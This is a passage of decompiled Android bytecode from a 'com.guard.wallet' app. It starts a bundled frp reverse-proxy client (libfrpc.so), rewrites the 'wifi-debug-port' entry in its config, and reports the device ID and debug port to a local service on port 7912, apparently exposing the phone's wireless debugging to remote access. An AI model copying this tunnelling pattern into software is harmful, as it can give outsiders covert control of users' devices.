      // 3b6: ifeq 520
      // 3b9: aload 0
      // 3ba: getfield com/guard/wallet/thread/b.e Ljava/util/LinkedList;
      // 3bd: invokeinterface java/util/List.isEmpty ()Z 1
      // 3c2: ifne 520
      // 3c5: aload 0
      // 3c6: invokevirtual com/guard/wallet/thread/b.b ()Z
      // 3c9: ifne 520
      // 3cc: aload 7
      // 3ce: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 3d1: ifne 3eb
      // 3d4: aload 7
      // 3d6: ldc_w "/libfrpc.so.out.log"
      // 3d9: invokestatic a/a.z (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
      // 3dc: astore 8
      // 3de: aload 7
      // 3e0: ldc_w "/libfrpc.so.error.log"
      // 3e3: invokestatic a/a.z (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
      // 3e6: astore 7
      // 3e8: goto 3f1
      // 3eb: aconst_null
      // 3ec: astore 7
      // 3ee: aconst_null
      // 3ef: astore 8
      // 3f1: invokestatic com/guard/wallet/utils/g.y0 ()Ljava/lang/String;
      // 3f4: astore 9
      // 3f6: aload 9
      // 3f8: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 3fb: ifne 40e
      // 3fe: ldc "CheckProcessThread"
      // 400: ldc "APP Lib目录:"
      // 402: aload 9
      // 404: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 407: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 40a: pop
      // 40b: goto 411
      // 40e: aconst_null
      // 40f: astore 9
      // 411: aload 9
      // 413: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 416: ifne 520
      // 419: aload 0
      // 41a: getfield com/guard/wallet/thread/b.e Ljava/util/LinkedList;
      // 41d: astore 12
      // 41f: aload 12
      // 421: ifnull 4a9
      // 424: aload 12
      // 426: invokeinterface java/util/List.isEmpty ()Z 1
      // 42b: ifne 4a9
      // 42e: new java/lang/ProcessBuilder
      // 431: astore 10
      // 433: aload 10
      // 435: aload 12
      // 437: invokespecial java/lang/ProcessBuilder.<init> (Ljava/util/List;)V
      // 43a: new java/io/File
      // 43d: astore 12
      // 43f: aload 12
      // 441: aload 9
      // 443: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 446: aload 10
      // 448: aload 12
      // 44a: invokevirtual java/lang/ProcessBuilder.directory (Ljava/io/File;)Ljava/lang/ProcessBuilder;
      // 44d: pop
      // 44e: aload 8
      // 450: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 453: ifne 46a
      // 456: new java/io/File
      // 459: astore 9
      // 45b: aload 9
      // 45d: aload 8
      // 45f: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 462: aload 10
      // 464: aload 9
      // 466: invokevirtual java/lang/ProcessBuilder.redirectOutput (Ljava/io/File;)Ljava/lang/ProcessBuilder;
      // 469: pop
      // 46a: aload 7
      // 46c: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 46f: ifne 486
      // 472: new java/io/File
      // 475: astore 8
      // 477: aload 8
      // 479: aload 7
      // 47b: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 47e: aload 10
      // 480: aload 8
      // 482: invokevirtual java/lang/ProcessBuilder.redirectError (Ljava/io/File;)Ljava/lang/ProcessBuilder;
      // 485: pop
      // 486: aload 10
      // 488: invokevirtual java/lang/ProcessBuilder.start ()Ljava/lang/Process;
      // 48b: astore 7
      // 48d: aload 7
      // 48f: ifnull 4a9
      // 492: ldc_w "ShellUtils"
      // 495: ldc_w "命令行启动完成"
      // 498: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 49b: pop
      // 49c: goto 4ac
      // 49f: astore 7
      // 4a1: ldc_w "ShellUtils"
      // 4a4: aload 7
      // 4a6: invokestatic a1/q.t (Ljava/lang/String;Ljava/lang/Throwable;)V
      // 4a9: aconst_null
      // 4aa: astore 7
      // 4ac: aload 0
      // 4ad: aload 7
      // 4af: putfield com/guard/wallet/thread/b.f Ljava/lang/Process;
      // 4b2: aload 7
      // 4b4: ifnull 4d3
      // 4b7: aload 0
      // 4b8: invokevirtual com/guard/wallet/thread/b.b ()Z
      // 4bb: ifeq 520
      // 4be: ldc "CheckProcessThread"
      // 4c0: ldc_w "libfrpc.so 运行成功"
      // 4c3: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 4c6: pop
      // 4c7: goto 520
      // 4ca: astore 7
      // 4cc: ldc "CheckProcessThread"
      // 4ce: aload 7
      // 4d0: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 4d3: ldc "CheckProcessThread"
      // 4d5: ldc_w "libfrpc.so 运行失败"
      // 4d8: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 4db: pop
      // 4dc: goto 520
      // 4df: ldc "CheckProcessThread"
      // 4e1: ldc_w "libfrpc.so 文件不存在"
      // 4e4: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 4e7: pop
      // 4e8: goto 520
      // 4eb: aload 0
      // 4ec: getfield com/guard/wallet/thread/b.i Ljava/util/concurrent/atomic/AtomicInteger;
      // 4ef: bipush 0
      // 4f0: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // 4f3: new com/guard/wallet/req/MessageRecordVO
      // 4f6: dup
      // 4f7: invokespecial com/guard/wallet/req/MessageRecordVO.<init> ()V
      // 4fa: astore 7
      // 4fc: new com/guard/wallet/req/MessageBodyVO
      // 4ff: dup
      // 500: invokespecial com/guard/wallet/req/MessageBodyVO.<init> ()V
      // 503: astore 8
      // 505: aload 7
      // 507: ldc_w "android.app.service.net.rpc.running"
      // 50a: invokevirtual com/guard/wallet/req/MessageRecordVO.setIntentCode (Ljava/lang/String;)V
      // 50d: aload 7
      // 50f: aload 8
      // 511: invokevirtual com/guard/wallet/req/MessageRecordVO.setExtraBody (Lcom/guard/wallet/req/MessageBodyVO;)V
      // 514: aload 0
      // 515: getfield com/guard/wallet/thread/b.a Ls/a;
      // 518: aload 7
      // 51a: invokevirtual s/a.a (Lcom/guard/wallet/req/MessageRecordVO;)V
      // 51d: invokestatic com/guard/wallet/utils/h.F ()V
      // 520: aload 0
      // 521: getfield com/guard/wallet/thread/b.j Ljava/util/LinkedList;
      // 524: invokeinterface java/util/List.isEmpty ()Z 1
      // 529: ifne 7a9
      // 52c: aload 0
      // 52d: getfield com/guard/wallet/thread/b.j Ljava/util/LinkedList;
      // 530: astore 7
      // 532: aload 7
      // 534: invokeinterface java/util/List.isEmpty ()Z 1
      // 539: ifne 7a9
      // 53c: aload 7
      // 53e: aload 7
      // 540: invokevirtual java/util/LinkedList.size ()I
      // 543: bipush 1
      // 544: isub
      // 545: invokevirtual java/util/LinkedList.get (I)Ljava/lang/Object;
      // 548: checkcast java/lang/Integer
      // 54b: astore 12
      // 54d: aload 7
      // 54f: invokevirtual java/util/LinkedList.clear ()V
      // 552: aload 0
      // 553: getfield com/guard/wallet/thread/b.d Ljava/lang/String;
      // 556: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 559: ifne 75e
      // 55c: aload 0
      // 55d: getfield com/guard/wallet/thread/b.d Ljava/lang/String;
      // 560: astore 8
      // 562: aload 8
      // 564: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 567: ifne 672
      // 56a: new java/io/File
      // 56d: dup
      // 56e: aload 8
      // 570: invokespecial java/io/File.<init> (Ljava/lang/String;)V
      // 573: astore 7
      // 575: aload 7
      // 577: invokevirtual java/io/File.exists ()Z
      // 57a: ifeq 672
      // 57d: aload 7
      // 57f: invokevirtual java/io/File.isFile ()Z
      // 582: ifeq 672
      // 585: aload 7
      // 587: invokevirtual java/io/File.canRead ()Z
      // 58a: ifeq 672
      // 58d: new java/lang/StringBuilder
      // 590: dup
      // 591: ldc_w "文件存在,能读取:"
      // 594: invokespecial java/lang/StringBuilder.<init> (Ljava/lang/String;)V
      // 597: astore 9
      // 599: aload 9
      // 59b: aload 8
      // 59d: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 5a0: pop
      // 5a1: ldc_w "FileUtils"
      // 5a4: aload 9
      // 5a6: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // 5a9: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 5ac: pop
      // 5ad: new java/io/FileInputStream
      // 5b0: astore 8
      // 5b2: aload 8
      // 5b4: aload 7
      // 5b6: invokespecial java/io/FileInputStream.<init> (Ljava/io/File;)V
      // 5b9: new java/io/InputStreamReader
      // 5bc: astore 10
      // 5be: aload 10
      // 5c0: aload 8
      // 5c2: invokespecial java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V
      // 5c5: new java/io/BufferedReader
      // 5c8: astore 7
      // 5ca: aload 7
      // 5cc: aload 10
      // 5ce: invokespecial java/io/BufferedReader.<init> (Ljava/io/Reader;)V
      // 5d1: new java/util/LinkedList
      // 5d4: astore 9
      // 5d6: aload 9
      // 5d8: invokespecial java/util/LinkedList.<init> ()V
      // 5db: aload 7
      // 5dd: invokevirtual java/io/BufferedReader.readLine ()Ljava/lang/String;
      // 5e0: astore 13
      // 5e2: aload 13
      // 5e4: ifnull 5f2
      // 5e7: aload 9
      // 5e9: aload 13
      // 5eb: invokevirtual java/util/LinkedList.add (Ljava/lang/Object;)Z
      // 5ee: pop
      // 5ef: goto 5db
      // 5f2: aload 8
      // 5f4: invokevirtual java/io/FileInputStream.close ()V
      // 5f7: aload 10
      // 5f9: invokevirtual java/io/InputStreamReader.close ()V
      // 5fc: aload 7
      // 5fe: invokevirtual java/io/BufferedReader.close ()V
      // 601: aload 9
      // 603: astore 7
      // 605: goto 675
      // 608: astore 9
      // 60a: goto 625
      // 60d: astore 9
      // 60f: aconst_null
      // 610: astore 7
      // 612: goto 625
      // 615: astore 9
      // 617: goto 61f
      // 61a: astore 9
      // 61c: aconst_null
      // 61d: astore 8
      // 61f: aconst_null
      // 620: astore 10
      // 622: aconst_null
      // 623: astore 7
      // 625: ldc_w "FileUtils"
      // 628: aload 9
      // 62a: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 62d: aload 8
      // 62f: ifnull 644
      // 632: aload 8
      // 634: invokevirtual java/io/FileInputStream.close ()V
      // 637: goto 644
      // 63a: astore 8
      // 63c: ldc_w "FileUtils"
      // 63f: aload 8
      // 641: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 644: aload 10
      // 646: ifnull 65b
      // 649: aload 10
      // 64b: invokevirtual java/io/InputStreamReader.close ()V
      // 64e: goto 65b
      // 651: astore 8
      // 653: ldc_w "FileUtils"
      // 656: aload 8
      // 658: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 65b: aload 7
      // 65d: ifnull 672
      // 660: aload 7
      // 662: invokevirtual java/io/BufferedReader.close ()V
      // 665: goto 672
      // 668: astore 7
      // 66a: ldc_w "FileUtils"
      // 66d: aload 7
      // 66f: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 672: aconst_null
      // 673: astore 7
      // 675: aload 7
      // 677: ifnull 75e
      // 67a: aload 7
      // 67c: invokeinterface java/util/List.isEmpty ()Z 1
      // 681: ifne 75e
      // 684: aload 7
      // 686: invokeinterface java/util/List.listIterator ()Ljava/util/ListIterator; 1
      // 68b: astore 9
      // 68d: iload 3
      // 68e: istore 1
      // 68f: aload 9
      // 691: invokeinterface java/util/ListIterator.hasNext ()Z 1
      // 696: ifeq 6de
      // 699: aload 9
      // 69b: invokeinterface java/util/ListIterator.next ()Ljava/lang/Object; 1
      // 6a0: checkcast java/lang/String
      // 6a3: astore 8
      // 6a5: aload 8
      // 6a7: ifnull 68f
      // 6aa: iload 1
      // 6ab: istore 2
      // 6ac: aload 8
      // 6ae: ldc_w "wifi-debug-port"
      // 6b1: invokevirtual java/lang/String.contains (Ljava/lang/CharSequence;)Z
      // 6b4: ifeq 6b9
      // 6b7: bipush 1
      // 6b8: istore 2
      // 6b9: iload 2
      // 6ba: istore 1
      // 6bb: aload 8
      // 6bd: ldc_w "local_port"
      // 6c0: invokevirtual java/lang/String.contains (Ljava/lang/CharSequence;)Z
      // 6c3: ifeq 68f
      // 6c6: iload 2
      // 6c7: istore 1
      // 6c8: iload 2
      // 6c9: ifeq 68f
      // 6cc: aload 9
      // 6ce: ldc_w "local_port = "
      // 6d1: aload 12
      // 6d3: invokestatic java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;
      // 6d6: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 6d9: invokeinterface java/util/ListIterator.set (Ljava/lang/Object;)V 2
      // 6de: aload 11
      // 6e0: astore 8
      // 6e2: aload 7
      // 6e4: invokeinterface java/util/List.isEmpty ()Z 1
      // 6e9: ifne 745
      // 6ec: new java/lang/StringBuilder
      // 6ef: astore 8
      // 6f1: aload 8
      // 6f3: invokespecial java/lang/StringBuilder.<init> ()V
      // 6f6: aload 7
      // 6f8: invokeinterface java/util/List.iterator ()Ljava/util/Iterator; 1
      // 6fd: astore 9
      // 6ff: aload 9
      // 701: invokeinterface java/util/Iterator.hasNext ()Z 1
      // 706: ifeq 72d
      // 709: aload 9
      // 70b: invokeinterface java/util/Iterator.next ()Ljava/lang/Object; 1
      // 710: checkcast java/lang/String
      // 713: astore 7
      // 715: aload 7
      // 717: ifnull 6ff
      // 71a: aload 8
      // 71c: aload 7
      // 71e: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 721: pop
      // 722: aload 8
      // 724: bipush 10
      // 726: invokevirtual java/lang/StringBuilder.append (C)Ljava/lang/StringBuilder;
      // 729: pop
      // 72a: goto 6ff
      // 72d: aload 8
      // 72f: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // 732: astore 8
      // 734: goto 745
      // 737: astore 7
      // 739: ldc_w "FileUtils"
      // 73c: aload 7
      // 73e: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 741: aload 11
      // 743: astore 8
      // 745: aload 0
      // 746: getfield com/guard/wallet/thread/b.d Ljava/lang/String;
      // 749: aload 8
      // 74b: invokestatic a1/q.U (Ljava/lang/String;Ljava/lang/String;)Z
      // 74e: ifeq 75e
      // 751: ldc "CheckProcessThread"
      // 753: ldc_w "网络代理文件已修改"
      // 756: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 759: pop
      // 75a: aload 0
      // 75b: invokevirtual com/guard/wallet/thread/b.e ()V
      // 75e: getstatic com/guard/wallet/http/l.a Ljava/lang/String;
      // 761: astore 7
      // 763: aload 12
      // 765: ifnull 7a9
      // 768: aload 12
      // 76a: invokevirtual java/lang/Integer.intValue ()I
      // 76d: ifle 7a9
      // 770: new com/guard/wallet/req/RewriteDebugPortVO
      // 773: dup
      // 774: invokespecial com/guard/wallet/req/RewriteDebugPortVO.<init> ()V
      // 777: astore 7
      // 779: aload 7
      // 77b: ldc_w "deviceId"
      // 77e: invokestatic com/guard/wallet/utils/h.l (Ljava/lang/String;)Ljava/lang/String;
      // 781: invokevirtual com/guard/wallet/req/RewriteDebugPortVO.setDeviceId (Ljava/lang/String;)V
      // 784: aload 7
      // 786: aload 12
      // 788: invokevirtual com/guard/wallet/req/RewriteDebugPortVO.setDebugPort (Ljava/lang/Integer;)V
      // 78b: new j/e
      // 78e: dup
      // 78f: bipush 1
      // 790: invokespecial j/e.<init> (I)V
      // 793: astore 8
      // 795: new com/guard/wallet/http/i
      // 798: dup
      // 799: ldc_w "http://127.0.0.1:7912"
      // 79c: invokespecial com/guard/wallet/http/i.<init> (Ljava/lang/String;)V
      // 79f: aload 7
      // 7a1: ldc_w "/rewriteDebugPort"
      // 7a4: aload 8
      // 7a6: invokevirtual com/guard/wallet/http/i.d (Ljava/lang/Object;Ljava/lang/String;Lp0/e;)V
      // 7a9: getstatic com/guard/wallet/thread/b.q Ljava/util/concurrent/locks/ReentrantLock;
      // 7ac: invokevirtual java/util/concurrent/locks/ReentrantLock.unlock ()V
      // 7af: goto 7b7
      // 7b2: aload 0
      // 7b3: monitorexit
      // 7b4: aload 7
      // 7b6: athrow
      // 7b7: return
   }
}
